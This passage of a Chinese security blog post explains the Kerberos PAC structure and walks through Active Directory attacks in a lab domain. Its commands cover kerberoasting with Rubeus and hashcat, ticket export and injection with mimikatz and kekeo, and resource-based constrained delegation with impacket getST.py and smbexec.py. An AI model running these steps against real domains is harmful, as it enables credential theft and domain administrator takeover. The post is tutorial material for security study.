ULONG PrimaryGroupId; </span><br><span class="line">   ULONG GroupCount;</span><br><span class="line">   [size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;//用户所在的组，如果我们可以篡改的这个的话，添加一个500(域管组)，那用户就是域管了。在ms14068 PAC签名被绕过，用户可以自己制作PAC的情况底下，pykek就是靠向这个地方写进域管组，成为使得改用户变成域管</span><br><span class="line">   ULONG UserFlags;</span><br><span class="line">   USER_SESSION_KEY UserSessionKey;</span><br><span class="line">   RPC_UNICODE_STRING LogonServer;</span><br><span class="line">   RPC_UNICODE_STRING LogonDomainName;</span><br><span class="line">   PISID LogonDomainId;</span><br><span class="line">   ULONG Reserved1[2];</span><br><span class="line">   ULONG UserAccountControl;</span><br><span class="line">   ULONG SubAuthStatus;</span><br><span class="line">   FILETIME LastSuccessfulILogon;</span><br><span class="line">   FILETIME LastFailedILogon;</span><br><span class="line">   ULONG FailedILogonCount;</span><br><span class="line">   ULONG Reserved3;</span><br><span class="line">   ULONG SidCount;</span><br><span class="line">   [size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;</span><br><span class="line">   PISID ResourceGroupDomainSid;</span><br><span class="line">   ULONG ResourceGroupCount;</span><br><span class="line">   [size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;</span><br><span class="line">&#125; KERB_VALIDATION_INFO;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>0x0000000A <strong>PAC_CLIENT_INFO</strong></p>
+</li>
+<li><p>客户端Id（8个字节）：</p>
+<p>包含在Kerberos初始TGT的authtime</p>
+</li>
+<li><p>NameLength（2字节）</p>
+<p>用于指定Name 字段的长度（以字节为单位）。</p>
+</li>
+<li><p>Name</p>
+<p>包含客户帐户名的16位Unicode字符数组，格式为低端字节序。</p>
+</li>
+<li><p>0x00000006和0x00000007 0x00000006 对应的是服务检验和，0x00000007 对应的是KDC校验和。分别由server密码和KDC密码加密，是为了防止PAC内容被篡改。</p>
+<p>存在签名的原因有两个。首先，存在带有服务器密钥的签名，以防止客户端生成自己的PAC并将其作为加密授权数据发送到KDC，以包含在票证中。其次，提供具有KDC密钥的签名，以防止不受信任的服务伪造带有无效PAC的票证。</p>
+<p>两个都是PAC_SIGNATURE_DATA结构，他包括以下结构。 1. SignatureType（4个字节）</p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="left">类型</th>
+<th align="left">含义</th>
+<th align="left">签名长度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">0xFFFFFF76</td>
+<td align="left">KERB_CHECKSUM_HMAC_MD5</td>
+<td align="left">16</td>
+</tr>
+<tr>
+<td align="left">0x0000000F</td>
+<td align="left">HMAC_SHA1_96_AES128</td>
+<td align="left">12</td>
+</tr>
+<tr>
+<td align="left">0x00000010</td>
+<td align="left">HMAC_SHA1_96_AES256</td>
+<td align="left">12</td>
+</tr>
+</tbody></table>
+<ol>
+<li><p>Signature</p>
+<p>包含校验和。签名的长度由SignatureType字段的值确定 3. RODCIdentifier（2个字节）：</p>
+<p>当KDC为RODC时，包含密钥版本号的前16位。当KDC不是RODC时，此字段不存在。</p>
+</li>
+</ol>
+<h3 id="相关安全问题及利用"><a href="#相关安全问题及利用" class="headerlink" title="相关安全问题及利用"></a>相关安全问题及利用</h3><h4 id="pass-the-ticket"><a href="#pass-the-ticket" class="headerlink" title="pass the ticket"></a>pass the ticket</h4><p>Kerbreos 除了第一步AS_ERQ是使用时间戳加密用户hash验证之外，其他的步骤的验证都是通过票据，这个票据 可以是TGT票据或者TGS票据。因为票据里面的内容主要是session_key和ticket(使用服务hash加密的，服务包括krbtgt)，拿到票据之后。我们就可以用这个票据来作为下阶段的验证了。</p>
+<h4 id="kerberosting"><a href="#kerberosting" class="headerlink" title="kerberosting"></a>kerberosting</h4><p>当我们完成AS请求之后会获得TGT票据，用这张TGT票据向KDC请求我们要访问的服务的TGS票据，认证通过后KDC会使用服务账户的hash加密TGS票据，所以我们可以通过爆破TGS票据的cipher字段获得服务账户的hash。</p>
+<h5 id="rubeus请求服务票据"><a href="#rubeus请求服务票据" class="headerlink" title="rubeus请求服务票据"></a>rubeus请求服务票据</h5><p>Rubeus里面的kerberoast支持对所有用户或者特定用户执行kerberoasting操作，其原理在于先用LDAP查询于内的spn<br>再通过发送TGS包，然后直接打印出能使用 hashcat或john 爆破的Hash。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20220408191059797.png" alt="image-20220408191059797"></p>
+<p>hashcat离线爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 &#x27;$krb5tgs$23$*deleg$self.com$priv/test*$BB50173429A6874A0B3AD8661C3C88F9$AA6CCE49E3A1BA4A990EEB1B967B8CB2260AAC404F5F8363521C20C5E2D11238A485CB93020A0E0E17EC57F46F4455865CAB056664FF2755C0DAC6246301E55EC9B4B17DC535ABE042902C7294090787C0E3B1421990048DF4D66434C2D1268F892556ACADBEDF86404EC763FC0BF70C053610D11CCFFFD1BD3FF6419ECE2829C1DC9F08D656C77D6A33DD6BE2038D18C501D57D68541B972AE782DC042593C5898383AEA28CD8D687B4639533AAB54131AB02FAF18935265C6C47676BA8EAD5E5A680DB6C477A599C1184634E03DEF53FF6899D5A8659D99D27516C928CD6ABD4C1DBF8CA81B75AD37A14778003BFAA9211D3DBF482AC7D1B5E3B1280D0A0E31455308DF69587BC48D28A6F3EC71E9756357826529E2FA508196EF924AA60915E7D417223A804527C9B19823905582A5C89DB57B1D40F508B2D72E40A28859C33488D6FA8550BCE6D2AD47BA5231ECCA6FF7514136E6152C840E7A7E713BE4924E29DBCD6D0155ECD4FDD8E55108D3277A90A9C45C1CF16DC086A244DBD1D2EAC24E7BEFEF0B9EDFAB2B0860FB183421FA4566DD6DCDDB8C995DBB72C05FDCC2C80281D22024E34B2FEB0FD93B47D97EE5D3AAAD4EB0B87FAA7BFE77FE973A93BA0B4A66AF155E9B9161EACBCC813BD28543C122AAAB4F002A6B496F401795F5D788222792FC19E0A7C3D1814131E19A5B5A4FC86412BB4966C1CD45FA19B339A48EBC0C0A0044661811D9EF7322346274836F8F536557C1D4C03F8F8956126E10E0BDCE95F6BB27DB6C0AC06AC069C263DA2D8475B9C668CFF5ECB2A3B00FF47B71A991E5DCCFC558FF7843347E2B3296F807387C4DD0ED15430471577BB8A261A74D50BF757537393FA5160ED7441CE7934E0350D89F45024EEE8732D5E54405404E1A4E5A8C2FECDB74BA8E8D4A0CE08D799F0FCBDA7B2FC31DF92BF91D7CB7B89AF59955AF2AEF1FED9E209E17E146339E202F82C54751904B492364F78321BC3445C3085231EE8197D7EF59E9B4FAADC30DD5029F346FC01E8C7D0B02E39249A5A1C378D39D4D8708B006EDB7435DBC45F628169C7A65F30C9F6DAA6EC8EDF3B40F004333CFE7D046FE02DF8EBDD6365A4C84E733304A8860EEFFCA6ABECD450BEEE09C9FE8C6650D0B963578369548333D91EA3BB86286B283E5A7B32CBB8163C22EF4DF230038CF9F6C0A3FF80AA1A743084B2565C2EDF597CD42777A91DC8306720FA440ECF35F9AEEDA1560E741F8062A7B7D71EE39D115965F831745DD35F1D1DE2811644673011173E4FCDC3D881B90361783CD4E688A2B85C548E4B0361F6D6329989D2566E21367D1271C29F45DE423779FB66E2A7DE4CDD4070AA823E422215B7A7D096F6728CD7A14CB178702E45F0FC87CFE02EF922BB7F37122D473E609F56E6901C0031F912FD56726D40969B0348&#x27; /home/kali/Public/pass.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20220408191742634.png" alt="image-20220408191742634"></p>
+<h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h4><p>在TGS_REP里面的ticket的encpart是使用服务的hash进行加密的，如果我们拥有服务的hash，就可以给我们自己签发任意用户的TGS票据，这个票据也被称为白银票据。相较于黄金票据，白银票据使用要访问服务的hash，而不是krbtgt的hash，由于生成的是tgs票据，不需要跟域控打交道，但是白银票票据只能访问特定服务。但是要注意的一点是，伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名，则银票将不起作用。</p>
+<h4 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h4><p>配置win-2016$非约束性委派</p>
+<p>我们登录到win2016机器上去使用mimikatz导出票据，只有win-2016$和deleg用户的票据</p>
+<p><img src="image-20220408194007949.png" alt="image-20220408194007949"></p>
+<p>现在我们去域控以administrator身份去访问WIN-2016</p>
+<p><img src="image-20220408200332660.png" alt="image-20220408200332660"></p>
+<p>因为配置了非约束性委派，此时，在主机win-2016的lsass.exe内存中就会有域管理员administrator的TGT票据。</p>
+<p>再次导出票据就会有administrator的票据</p>
+<p><img src="image-20220408224321845.png" alt="image-20220408224321845"></p>
+<p>清空票据</p>
+<p><img src="image-20220408194825478.png" alt="image-20220408194825478"></p>
+<p><img src="image-20220408194921226.png" alt="image-20220408194921226"></p>
+<p>将TGT票据导入内存中</p>
+<p><img src="image-20220408224440067.png" alt="image-20220408224440067"></p>
+<p><img src="image-20220408224504303.png" alt="image-20220408224504303"></p>
+<h4 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h4><p>配置约束委派</p>
+<p><img src="image-20220408224740654.png" alt="image-20220408224740654"></p>
+<h5 id="kekeo约束委派攻击"><a href="#kekeo约束委派攻击" class="headerlink" title="kekeo约束委派攻击"></a>kekeo约束委派攻击</h5><p>先清空票据</p>
+<p><img src="image-20220407105539682.png" alt="image-20220407105539682"></p>
+<p>请求票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.\kekeo.exe</span><br><span class="line">tgt::ask /user:deleg /domain:self.com /password:123.com</span><br><span class="line">Tgs::s4u /tgt:TGT_deleg@SELF.COM_krbtgt~self.com@SELF.COM.kirbi /user:Administrator /service:cifs/WIN-4QH1BAMD7NP.self.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20220407105943152.png" alt="image-20220407105943152"></p>
+<p>将票据注入内存</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe</span><br><span class="line">kerberos::purge</span><br><span class="line">kerberos::ptt </span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20220407110059370.png" alt="image-20220407110059370"></p>
+<p><img src="image-20220407110129251.png" alt="image-20220407110129251"></p>
+<p><img src="image-20220407110215952.png" alt="image-20220407110215952"></p>
+<h4 id="基于资源的约束委派攻击"><a href="#基于资源的约束委派攻击" class="headerlink" title="基于资源的约束委派攻击"></a>基于资源的约束委派攻击</h4><p>配置基于资源的约束委派</p>
+<p>在域控中设置允许server1用户基于资源的约束委派</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-ADComputer WIN-4QH1BAMD7NP -Properties PrincipalsAllowedToDelegateToAccount</span><br><span class="line">Set-ADComputer WIN-4QH1BAMD7NP -PrincipalsAllowedToDelegateToAccount server1$</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20220408225312831.png" alt="image-20220408225312831"></p>
+<h5 id="impacket进行基于资源的约束性委派攻击"><a href="#impacket进行基于资源的约束性委派攻击" class="headerlink" title="impacket进行基于资源的约束性委派攻击"></a>impacket进行基于资源的约束性委派攻击</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./getST.py -dc-ip WIN-4QH1BAMD7NP.self.com self.com/server1$:123.com -spn cifs/WIN-4QH1BAMD7NP.self.com -impersonate administrator</span><br><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line">./smbexec.py -no-pass -k WIN-4QH1BAMD7NP.self.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20220408225954666.png" alt="image-20220408225954666"></p>
+
+            
+
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">标签</span><br/>
+                
+    <a class="tag tag--primary tag--small t-none-link" href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" rel="tag">内网安全</a>
+
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a
+                        class="post-action-btn btn btn--disabled"
+                        aria-hidden="true"
+                    >
+                        
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2022/02/19/20220219/"
+                    data-tooltip="内网安全之kerberos(一)"
+                    aria-label="下一篇: 内网安全之kerberos(一)"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://self209.github.io/2022/02/25/20220225/"
+                    title="分享到 Twitter"
+                    aria-label="分享到 Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=https://self209.github.io/2022/02/25/20220225/"
+                    title="分享到 Google+"
+                    aria-label="分享到 Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2022/02/25/20220225/&amp;title=内网安全之kerberos(二)"
+                    title="分享到 QQ"
+                    aria-label="分享到 QQ"
+                >
+                    <i class="fab fa-qq" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="目录">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2022 self_209. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a
+                        class="post-action-btn btn btn--disabled"
+                        aria-hidden="true"
+                    >
+                        
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2022/02/19/20220219/"
+                    data-tooltip="内网安全之kerberos(一)"
+                    aria-label="下一篇: 内网安全之kerberos(一)"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://self209.github.io/2022/02/25/20220225/"
+                    title="分享到 Twitter"
+                    aria-label="分享到 Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=https://self209.github.io/2022/02/25/20220225/"
+                    title="分享到 Google+"
+                    aria-label="分享到 Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2022/02/25/20220225/&amp;title=内网安全之kerberos(二)"
+                    title="分享到 QQ"
+                    aria-label="分享到 QQ"
+                >
+                    <i class="fab fa-qq" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="目录">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=https://self209.github.io/2022/02/25/20220225/"
+                        aria-label="分享到 Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://plus.google.com/share?url=https://self209.github.io/2022/02/25/20220225/"
+                        aria-label="分享到 Google+"
+                    >
+                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2022/02/25/20220225/&amp;title=内网安全之kerberos(二)"
+                        aria-label="分享到 QQ"
+                    >
+                        <i class="fab fa-qq" aria-hidden="true"></i><span>分享到 QQ</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+
+
+            
+        </div>
+        
+
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
+        
+            <h4 id="about-card-name">self_209</h4>
+        
+            <div id="about-card-bio"><p>author.bio</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>author.job</p>
+
+            </div>
+        
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+
+<script src="/assets/js/script-xim376viwh5lr12gw0yeibdthi5jv6dbtso7hirh0xa2nvwxpntwvib0dgwh.min.js"></script>
+
+<!--SCRIPTS END-->
+
+
+
+
+
+    </body>
+</html>
